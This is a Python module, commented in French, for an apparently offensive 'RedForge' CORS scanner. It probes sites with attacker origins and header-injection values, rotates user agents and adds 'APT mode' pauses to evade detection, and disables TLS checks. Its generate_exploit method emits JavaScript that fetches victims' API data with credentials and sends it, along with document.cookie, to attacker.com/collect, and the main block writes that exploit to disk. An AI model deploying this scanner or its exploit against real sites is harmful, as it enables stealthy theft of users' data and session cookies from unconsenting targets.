#!/usr/bin/env python3
# -*- coding: utf-8 -*-
"""
Module de détection de mauvaises configurations CORS pour RedForge
Détecte les vulnérabilités liées à Cross-Origin Resource Sharing
Version avec support furtif, APT et techniques avancées
"""

import re
import time
import random
import requests
from typing import Dict, Any, List, Optional, Tuple, Set
from dataclasses import dataclass, field
from urllib.parse import urlparse, urljoin
import json

@dataclass
class CORSConfig:
    """Configuration avancée pour la détection CORS"""
    # Délais
    delay_between_requests: Tuple[float, float] = (0.5, 1.5)
    delay_between_origins: Tuple[float, float] = (1, 3)
    
    # Comportement
    test_all_origins: bool = True
    test_subdomain_variations: bool = True
    test_null_origin: bool = True
    deep_analysis: bool = False
    
    # Furtivité
    stealth_headers: bool = True
    random_user_agents: bool = True
    random_delays: bool = True
    
    # APT
    apt_mode: bool = False
    passive_detection: bool = False
    avoid_detection: bool = True
    
    # Analyse avancée
    test_header_injection: bool = True
    test_credentials_leak: bool = True
    detect_cors_misconfigurations: bool = True


class CORMisconfigurationDetector:
    """Détection avancée des mauvaises configurations CORS"""
    
    def __init__(self, config: Optional[CORSConfig] = None):
        """
        Initialise le détecteur de vulnérabilités CORS
        
        Args:
            config: Configuration personnalisée
        """
        self.config = config or CORSConfig()
        
        # Origines de test
        self.test_origins = [
            "https://evil.com",
            "https://attacker.com",
            "https://example.com.evil.com",
            "https://evil.com/example.com",
            "https://evil-example.com",
            "https://example.com.attacker.com",
            "https://attacker.com/example.com",
            "http://evil.com",
            "https://evil.com:8080"
        ]
        
        # Variations de sous-domaines
        self.subdomain_variations = [
            "evil-{domain}",
            "evil.{domain}",
            "{domain}.evil.com",
            "attacker-{domain}",
            "secure-{domain}.evil.com"
        ]
        
        # Headers sensibles
        self.sensitive_headers = [
            "Authorization",
            "Cookie",
            "X-CSRF-Token",
            "X-Requested-With",
            "X-Auth-Token",
            "API-Key",
            "Access-Token",
            "Bearer",
            "X-API-Key",
            "Session-ID",
            "X-Session-Token"
        ]
        
        # Patterns de vulnérabilités CORS
        self.cors_vulnerability_patterns = {
            "wildcard": r'^[*/]$|^\*$',
            "reflected": r'^https?://[^/]+',
            "partial_match": r'^https?://[^/]+\.[^/]+',
            "null": r'^null$',
            "multiple": r','
        }
        
        # User agents pour furtivité
        self.user_agents = [
            'Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/91.0.4472.124 Safari/537.36',
            'Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/14.1.1 Safari/605.1.15',
            'Mozilla/5.0 (X11; Linux x86_64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/92.0.4515.107 Safari/537.36'
        ]
        
        # Métriques
        self.start_time = None
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        self.rate_limit_hits = 0
    
    def scan(self, target: str, **kwargs) -> Dict[str, Any]:
        """
        Scanne les mauvaises configurations CORS
        
        Args:
            target: URL cible
            **kwargs: Options de configuration
                - origins: Origines supplémentaires à tester
                - test_methods: Tester les méthodes HTTP
                - depth: Profondeur de scan
                - apt_mode: Mode APT
        """
        self.start_time = time.time()
        self.tests_performed = 0
        self.vulnerabilities_found = 0
        
        # Mettre à jour la configuration
        self._update_config(kwargs)
        
        if not target.startswith(('http://', 'https://')):
            target = 'https://' + target
        
        print(f"  → Test des configurations CORS sur {target}")
        if self.config.apt_mode:
            print(f"  🕵️ Mode APT activé - Détection discrète")
        
        vulnerabilities = []
        
        # Préparer les origines à tester
        origins_to_test = self._prepare_test_origins(target, kwargs)
        
        print(f"    → Test de {len(origins_to_test)} origines")
        
        # Tester chaque origine
        for idx, origin in enumerate(origins_to_test):
            # Pause APT
            if self.config.apt_mode and self.config.avoid_detection:
                if idx > 0:
                    self._apt_pause()
            elif self.config.random_delays and idx > 0:
                time.sleep(random.uniform(*self.config.delay_between_origins))
            
            result = self._test_cors_origin(target, origin)
            self.tests_performed += 1
            
            if result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "origin": origin,
                    "severity": result['severity'],
                    "issue": result['issue'],
                    "details": result['details'],
                    "risk_score": result.get('risk_score', 70),
                    "proof": result.get('proof')
                })
                print(f"      ✓ CORS vulnérable: {origin} ({result['severity']})")
        
        # Tester l'accès avec credentials
        if self.config.test_credentials_leak:
            cred_result = self._test_credentials_access(target)
            if cred_result['vulnerable']:
                self.vulnerabilities_found += 1
                vulnerabilities.append({
                    "origin": "any",
                    "severity": "CRITICAL",
                    "issue": "credentials_access",
                    "details": cred_result['details'],
                    "risk_score": 95
                })
                print(f"      ✓ Accès CORS avec credentials possible")
        
        # Analyse avancée des headers
        if self.config.deep_analysis:
            header_analysis = self._analyze_cors_headers(target)
            if header_analysis.get('vulnerabilities'):
                vulnerabilities.extend(header_analysis['vulnerabilities'])
        
        # Tester les injections de headers
        if self.config.test_header_injection:
            injection_results = self._test_header_injection(target)
            if injection_results:
                vulnerabilities.extend(injection_results)
        
        return self._generate_results(target, vulnerabilities)
    
    def _update_config(self, kwargs: Dict):
        """Met à jour la configuration avec les kwargs"""
        if 'depth' in kwargs:
            self.config.deep_analysis = kwargs['depth'] == 'full'
        if 'test_all_origins' in kwargs:
            self.config.test_all_origins = kwargs['test_all_origins']
        if 'test_methods' in kwargs:
            self.config.test_subdomain_variations = kwargs['test_methods']
        
        # Mode APT
        if kwargs.get('apt_mode', False) or kwargs.get('stealth_level') == 'apt':
            self.config.apt_mode = True
            self.config.passive_detection = True
            self.config.avoid_detection = True
            self.config.stealth_headers = True
            self.config.random_delays = True
            self.config.delay_between_origins = (5, 15)
    
    def _get_stealth_headers(self, additional_headers: Optional[Dict] = None) -> Dict[str, str]:
        """Génère des headers furtifs"""
        headers = {
            'Accept': 'text/html,application/xhtml+xml,application/xml;q=0.9,image/webp,*/*;q=0.8',
            'Accept-Language': 'en-US,en;q=0.5',
            'Accept-Encoding': 'gzip, deflate',
            'Connection': 'keep-alive'
        }
        
        if self.config.random_user_agents:
            headers['User-Agent'] = random.choice(self.user_agents)
        
        if self.config.stealth_headers:
            headers['Cache-Control'] = 'no-cache'
            headers['Pragma'] = 'no-cache'
        
        if additional_headers:
            headers.update(additional_headers)
        
        return headers
    
    def _prepare_test_origins(self, target: str, kwargs: Dict) -> List[str]:
        """Prépare la liste des origines à tester"""
        origins = self.test_origins.copy()
        
        # Ajouter les origines personnalisées
        if kwargs.get('origins'):
            origins.extend(kwargs['origins'])
        
        # Ajouter l'origine null
        if self.config.test_null_origin:
            origins.append("null")
        
        # Ajouter les variations de sous-domaines
        if self.config.test_subdomain_variations:
            parsed = urlparse(target)
            domain = parsed.netloc.split(':')[0]
            
            for variation in self.subdomain_variations:
                evil_domain = variation.format(domain=domain)
                origins.append(f"https://{evil_domain}")
                origins.append(f"http://{evil_domain}")
        
        # Ajouter l'origine avec chemin
        origins.append(f"https://evil.com/{parsed.netloc}")
        
        # Supprimer les doublons
        origins = list(dict.fromkeys(origins))
        
        # Limiter en mode APT
        if self.config.apt_mode:
            origins = origins[:10]
        
        return origins
    
    def _test_cors_origin(self, target: str, origin: str) -> Dict[str, Any]:
        """
        Teste une origine spécifique pour les vulnérabilités CORS
        
        Args:
            target: URL cible
            origin: Origine à tester
        """
        result = {
            "vulnerable": False,
            "severity": None,
            "issue": None,
            "details": None,
            "risk_score": 0,
            "proof": None
        }
        
        try:
            # Requête OPTIONS (preflight)
            headers = self._get_stealth_headers({
                'Origin': origin,
                'Access-Control-Request-Method': 'GET',
                'Access-Control-Request-Headers': 'Content-Type, Authorization'
            })
            
            response = requests.options(target, headers=headers, timeout=10, verify=False)
            
            # Analyser la réponse CORS
            acao = response.headers.get('Access-Control-Allow-Origin')
            acac = response.headers.get('Access-Control-Allow-Credentials')
            acam = response.headers.get('Access-Control-Allow-Methods')
            acah = response.headers.get('Access-Control-Allow-Headers')
            
            if acao:
                result = self._analyze_cors_response(acao, acac, origin, target)
                
                # Tester avec une requête GET réelle
                if result['vulnerable']:
                    get_response = self._test_actual_request(target, origin)
                    if get_response.get('success'):
                        result['proof'] = get_response.get('data_preview', 'Données accessibles')
            
        except requests.exceptions.Timeout:
            result['error'] = "Timeout"
        except Exception as e:
            if not self.config.passive_detection:
                result['error'] = str(e)
        
        return result
    
    def _analyze_cors_response(self, acao: str, acac: str, origin: str, target: str) -> Dict[str, Any]:
        """Analyse la réponse CORS pour détecter les vulnérabilités"""
        result = {
            "vulnerable": False,
            "severity": None,
            "issue": None,
            "details": None,
            "risk_score": 0
        }
        
        # Cas 1: Wildcard
        if acao == '*':
            result["vulnerable"] = True
            result["severity"] = "HIGH"
            result["issue"] = "wildcard_origin"
            result["details"] = "Access-Control-Allow-Origin: * - Accepte toute origine"
            result["risk_score"] = 85
            
            if acac and acac.lower() == 'true':
                result["severity"] = "CRITICAL"
                result["details"] += " avec credentials"
                result["risk_score"] = 95
        
        # Cas 2: Origine reflétée
        elif acao == origin:
            result["vulnerable"] = True
            result["severity"] = "HIGH"
            result["issue"] = "reflected_origin"
            result["details"] = f"Reflète l'origine: {acao}"
            result["risk_score"] = 80
            
            if acac and acac.lower() == 'true':
                result["severity"] = "CRITICAL"
                result["details"] += " avec credentials"
                result["risk_score"] = 90
        
        # Cas 3: Correspondance partielle
        elif origin.startswith(acao.rstrip('/')) or (acao in origin and acao != origin):
            result["vulnerable"] = True
            result["severity"] = "MEDIUM"
            result["issue"] = "partial_match"
            result["details"] = f"Correspondance partielle: {acao} vs {origin}"
            result["risk_score"] = 70
            
            if acac and acac.lower() == 'true':
                result["severity"] = "HIGH"
                result["risk_score"] = 85
        
        # Cas 4: Origine null
        elif acao == 'null' and origin == 'null':
            result["vulnerable"] = True
            result["severity"] = "MEDIUM"
            result["issue"] = "null_origin"
            result["details"] = "Accepte l'origine null - vulnérable aux attaques de sandbox"
            result["risk_score"] = 75
        
        # Cas 5: Multiples origines
        elif ',' in acao:
            result["vulnerable"] = True
            result["severity"] = "MEDIUM"
            result["issue"] = "multiple_origins"
            result["details"] = f"Accepte plusieurs origines: {acao}"
            result["risk_score"] = 65
        
        return result
    
    def _test_actual_request(self, target: str, origin: str) -> Dict[str, Any]:
        """Teste une requête GET réelle pour vérifier l'accès aux données"""
        result = {
            "success": False,
            "data_preview": None
        }
        
        try:
            headers = self._get_stealth_headers({'Origin': origin})
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            acao = response.headers.get('Access-Control-Allow-Origin')
            
            if acao and (acao == origin or acao == '*'):
                result["success"] = True
                # Prévisualiser les données
                data_preview = response.text[:500] if response.text else "Réponse vide"
                result["data_preview"] = data_preview[:200] + "..." if len(data_preview) > 200 else data_preview
                
        except Exception:
            pass
        
        return result
    
    def _test_credentials_access(self, target: str) -> Dict[str, Any]:
        """
        Teste si les credentials peuvent être exposés via CORS
        
        Args:
            target: URL cible
        """
        result = {
            "vulnerable": False,
            "details": None
        }
        
        try:
            # Tester avec différentes origines
            test_origins = self.test_origins[:3] if not self.config.apt_mode else self.test_origins[:1]
            
            for origin in test_origins:
                headers = self._get_stealth_headers({
                    'Origin': origin,
                    'Access-Control-Request-Method': 'GET',
                    'Access-Control-Request-Headers': 'Authorization, Cookie, X-CSRF-Token'
                })
                
                response = requests.options(target, headers=headers, timeout=10, verify=False)
                
                acac = response.headers.get('Access-Control-Allow-Credentials')
                acao = response.headers.get('Access-Control-Allow-Origin')
                
                if acac and acac.lower() == 'true' and acao:
                    if acao == origin or acao == '*':
                        result["vulnerable"] = True
                        result["details"] = f"Credentials acceptés depuis {acao}"
                        break
                        
        except Exception:
            pass
        
        return result
    
    def _analyze_cors_headers(self, target: str) -> Dict[str, Any]:
        """Analyse approfondie des headers CORS"""
        analysis = {
            "vulnerabilities": [],
            "headers": {}
        }
        
        try:
            headers = self._get_stealth_headers()
            response = requests.get(target, headers=headers, timeout=10, verify=False)
            
            # Collecter tous les headers CORS
            cors_headers = {k: v for k, v in response.headers.items() if k.startswith('Access-Control-')}
            analysis["headers"] = cors_headers
            
            # Vérifier les headers sensibles exposés
            exposed_headers = response.headers.get('Access-Control-Expose-Headers', '')
            for sensitive in self.sensitive_headers:
                if sensitive.lower() in exposed_headers.lower():
                    analysis["vulnerabilities"].append({
                        "origin": target,
                        "severity": "MEDIUM",
                        "issue": "exposed_sensitive_headers",
                        "details": f"Header sensible exposé: {sensitive}",
                        "risk_score": 70
                    })
            
            # Vérifier la durée de cache preflight
            max_age = response.headers.get('Access-Control-Max-Age')
            if max_age and int(max_age) > 86400:  # Plus de 24h
                analysis["vulnerabilities"].append({
                    "origin": target,
                    "severity": "LOW",
                    "issue": "long_preflight_cache",
                    "details": f"Cache preflight trop long: {max_age}s",
                    "risk_score": 40
                })
                
        except Exception:
            pass
        
        return analysis
    
    def _test_header_injection(self, target: str) -> List[Dict[str, Any]]:
        """Teste les injections de headers pour contourner CORS"""
        vulnerabilities = []
        
        # Headers à injecter
        injection_headers = [
            ('X-Forwarded-Host', 'evil.com'),
            ('X-Original-URL', '/admin'),
            ('X-Rewrite-URL', '/admin'),
            ('X-Forwarded-For', 'evil.com'),
            ('X-Host', 'evil.com'),
            ('X-Forwarded-Server', 'evil.com')
        ]
        
        for header_name, header_value in injection_headers:
            try:
                headers = self._get_stealth_headers({
                    'Origin': 'https://evil.com',
                    header_name: header_value
                })
                
                response = requests.options(target, headers=headers, timeout=10, verify=False)
                acao = response.headers.get('Access-Control-Allow-Origin')
                
                if acao and 'evil.com' in acao:
                    vulnerabilities.append({
                        "origin": "injection",
                        "severity": "HIGH",
                        "issue": "header_injection",
                        "details": f"Injection via {header_name}: {header_value}",
                        "risk_score": 85
                    })
                    
            except Exception:
                continue
        
        return vulnerabilities
    
    def _apt_pause(self):
        """Pause APT pour simuler un comportement humain"""
        if random.random() < 0.3:
            pause_duration = random.uniform(30, 120)
            print(f"      💤 Pause APT: {pause_duration:.0f}s")
            time.sleep(pause_duration)
    
    def _generate_results(self, target: str, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère les résultats de l'attaque"""
        duration = time.time() - self.start_time
        
        # Calculer les scores
        critical_count = len([v for v in vulnerabilities if v.get('severity') == 'CRITICAL'])
        high_count = len([v for v in vulnerabilities if v.get('severity') == 'HIGH'])
        medium_count = len([v for v in vulnerabilities if v.get('severity') == 'MEDIUM'])
        
        return {
            "target": target,
            "vulnerabilities": vulnerabilities,
            "count": len(vulnerabilities),
            "tests_performed": self.tests_performed,
            "scan_duration": duration,
            "tests_per_second": self.tests_performed / duration if duration > 0 else 0,
            "vulnerability_rate": (len(vulnerabilities) / self.tests_performed * 100) if self.tests_performed > 0 else 0,
            "severity_counts": {
                "CRITICAL": critical_count,
                "HIGH": high_count,
                "MEDIUM": medium_count,
                "LOW": len([v for v in vulnerabilities if v.get('severity') == 'LOW'])
            },
            "config": {
                "apt_mode": self.config.apt_mode,
                "deep_analysis": self.config.deep_analysis,
                "test_subdomain_variations": self.config.test_subdomain_variations
            },
            "summary": self._generate_summary(vulnerabilities),
            "recommendations": self._generate_recommendations(vulnerabilities)
        }
    
    def _generate_summary(self, vulnerabilities: List[Dict]) -> Dict[str, Any]:
        """Génère un résumé des vulnérabilités"""
        if not vulnerabilities:
            return {"total": 0, "severity": "INFO", "message": "Aucune vulnérabilité CORS détectée"}
        
        return {
            "total": len(vulnerabilities),
            "by_issue": {
                "wildcard_origin": len([v for v in vulnerabilities if v.get('issue') == 'wildcard_origin']),
                "reflected_origin": len([v for v in vulnerabilities if v.get('issue') == 'reflected_origin']),
                "partial_match": len([v for v in vulnerabilities if v.get('issue') == 'partial_match']),
                "credentials_access": len([v for v in vulnerabilities if v.get('issue') == 'credentials_access']),
                "null_origin": len([v for v in vulnerabilities if v.get('issue') == 'null_origin'])
            },
            "max_risk_score": max([v.get('risk_score', 0) for v in vulnerabilities]) if vulnerabilities else 0
        }
    
    def _generate_recommendations(self, vulnerabilities: List[Dict]) -> List[str]:
        """Génère des recommandations basées sur les vulnérabilités trouvées"""
        recommendations = set()
        
        for vuln in vulnerabilities:
            issue = vuln.get('issue', '')
            
            if issue == 'wildcard_origin':
                recommendations.add("Ne jamais utiliser Access-Control-Allow-Origin: * avec des credentials")
                recommendations.add("Utiliser une liste blanche d'origines autorisées")
            
            elif issue == 'reflected_origin':
                recommendations.add("Valider strictement les origines contre une liste blanche")
                recommendations.add("Ne pas refléter dynamiquement l'origine des requêtes")
            
            elif issue == 'partial_match':
                recommendations.add("Utiliser des correspondances exactes, pas partielles")
                recommendations.add("Sanitizer les origines avant validation")
            
            elif issue == 'credentials_access':
                recommendations.add("Limiter les origines autorisées pour les credentials")
                recommendations.add("Auditer régulièrement la configuration CORS")
            
            elif issue == 'null_origin':
                recommendations.add("Refuser l'origine null dans la politique CORS")
                recommendations.add("Configurer des règles spécifiques pour les sandbox")
        
        if not recommendations:
            recommendations.add("Configurer CORS avec le principe du moindre privilège")
            recommendations.add("Auditer régulièrement la configuration CORS")
        
        return list(recommendations)
    
    def test_preflight(self, target: str, origin: str, methods: List[str] = None) -> Dict[str, Any]:
        """
        Teste la requête preflight CORS
        
        Args:
            target: URL cible
            origin: Origine à tester
            methods: Méthodes HTTP à tester
        """
        if methods is None:
            methods = ['GET', 'POST', 'PUT', 'DELETE', 'PATCH', 'OPTIONS']
        
        result = {
            "origin": origin,
            "allowed_methods": [],
            "allowed_headers": [],
            "exposed_headers": [],
            "max_age": None,
            "credentials_allowed": False,
            "vulnerable": False
        }
        
        try:
            headers = self._get_stealth_headers({
                'Origin': origin,
                'Access-Control-Request-Method': methods[0],
                'Access-Control-Request-Headers': 'Content-Type, Authorization, X-CSRF-Token'
            })
            
            response = requests.options(target, headers=headers, timeout=10, verify=False)
            
            # Récupérer les méthodes autorisées
            acam = response.headers.get('Access-Control-Allow-Methods')
            if acam:
                result["allowed_methods"] = [m.strip() for m in acam.split(',')]
            
            # Récupérer les headers autorisés
            acah = response.headers.get('Access-Control-Allow-Headers')
            if acah:
                result["allowed_headers"] = [h.strip() for h in acah.split(',')]
            
            # Récupérer les headers exposés
            aceh = response.headers.get('Access-Control-Expose-Headers')
            if aceh:
                result["exposed_headers"] = [h.strip() for h in aceh.split(',')]
            
            # Max age
            max_age = response.headers.get('Access-Control-Max-Age')
            if max_age:
                result["max_age"] = int(max_age)
            
            # Credentials
            acac = response.headers.get('Access-Control-Allow-Credentials')
            result["credentials_allowed"] = acac and acac.lower() == 'true'
            
            # Vérifier la vulnérabilité
            acao = response.headers.get('Access-Control-Allow-Origin')
            if acao and (acao == origin or acao == '*'):
                result["vulnerable"] = True
            
        except Exception as e:
            result["error"] = str(e)
        
        return result
    
    def generate_exploit(self, target: str, origin: str) -> str:
        """
        Génère un exploit JavaScript pour exploiter les mauvaises configs CORS
        
        Args:
            target: URL cible
            origin: Origine autorisée
        """
        exploit_js = f'''
// Exploit CORS pour {target}
// RedForge - Cross-Origin Resource Sharing Exploit

const target = "{target}";
const origin = "{origin}";
const exfil_endpoint = "https://attacker.com/collect";

class CORSExploit {{
    constructor() {{
        this.victimData = [];
        this.interval = null;
    }}
    
    async fetchData(endpoint) {{
        try {{
            const response = await fetch(endpoint, {{
                method: 'GET',
                mode: 'cors',
                credentials: 'include',
                headers: {{
                    'Origin': origin,
                    'X-Requested-With': 'XMLHttpRequest'
                }}
            }});
            
            if (response.ok) {{
                const data = await response.text();
                return data;
            }}
        }} catch (error) {{
            console.error('Erreur fetch:', error);
        }}
        return null;
    }}
    
    async exfiltrate(data) {{
        try {{
            const payload = {{
                target: target,
                data: data,
                timestamp: Date.now(),
                userAgent: navigator.userAgent,
                cookies: document.cookie
            }};
            
            // Envoyer à l'attaquant
            fetch(exfil_endpoint, {{
                method: 'POST',
                mode: 'no-cors',
                body: JSON.stringify(payload),
                headers: {{
                    'Content-Type': 'application/json'
                }}
            }});
            
            this.victimData.push(payload);
            console.log('Données exfiltrées:', payload);
            
        }} catch (error) {{
            console.error('Erreur exfiltration:', error);
        }}
    }}
    
    async exploit() {{
        console.log('Début exploitation CORS - Cible:', target);
        
        // Récupérer la page principale
        const mainData = await this.fetchData(target);
        if (mainData) {{
            await this.exfiltrate(mainData.substring(0, 10000));
        }}
        
        // Tenter de récupérer des endpoints communs
        const commonEndpoints = [
            '/api/user',
            '/api/profile',
            '/api/settings',
            '/admin/config',
            '/api/data',
            '/users/me',
            '/account/info'
        ];
        
        for (const endpoint of commonEndpoints) {{
            const endpointData = await this.fetchData(target + endpoint);
            if (endpointData) {{
                await this.exfiltrate(endpointData.substring(0, 5000));
            }}
        }}
    }}
    
    startPeriodicScan(intervalMs = 30000) {{
        this.interval = setInterval(() => this.exploit(), intervalMs);
        console.log(`Scan périodique démarré (intervalle: ${intervalMs}ms)`);
    }}
    
    stopPeriodicScan() {{
        if (this.interval) {{
            clearInterval(this.interval);
            console.log('Scan périodique arrêté');
        }}
    }}
}}

// Exécuter l'exploit
const exploit = new CORSExploit();
exploit.exploit();

// Option: scan périodique
// exploit.startPeriodicScan(30000);

console.log('Exploit CORS chargé - RedForge');
'''
        
        return exploit_js
    
    def get_statistics(self) -> Dict[str, Any]:
        """Retourne les statistiques de détection"""
        return {
            "tests_performed": self.tests_performed,
            "vulnerabilities_found": self.vulnerabilities_found,
            "success_rate": (self.vulnerabilities_found / self.tests_performed * 100) if self.tests_performed > 0 else 0,
            "rate_limit_hits": self.rate_limit_hits,
            "scan_duration": time.time() - self.start_time if self.start_time else 0
        }


# Point d'entrée pour tests
if __name__ == "__main__":
    # Test mode normal
    print("=== Test mode normal ===")
    detector = CORMisconfigurationDetector()
    results = detector.scan("https://api.example.com")
    print(f"Vulnérabilités CORS: {results['count']}")
    
    # Test mode APT
    print("\n=== Test mode APT ===")
    apt_config = CORSConfig(apt_mode=True, passive_detection=True)
    detector_apt = CORMisconfigurationDetector(config=apt_config)
    results_apt = detector_apt.scan("https://api.example.com", apt_mode=True)
    print(f"Vulnérabilités CORS (APT): {results_apt['count']}")
    
    # Générer exploit
    if results_apt['vulnerabilities']:
        exploit = detector_apt.generate_exploit("https://api.example.com", "https://evil.com")
        with open("cors_exploit.js", "w") as f:
            f.write(exploit)
        print("Exploit CORS généré: cors_exploit.js")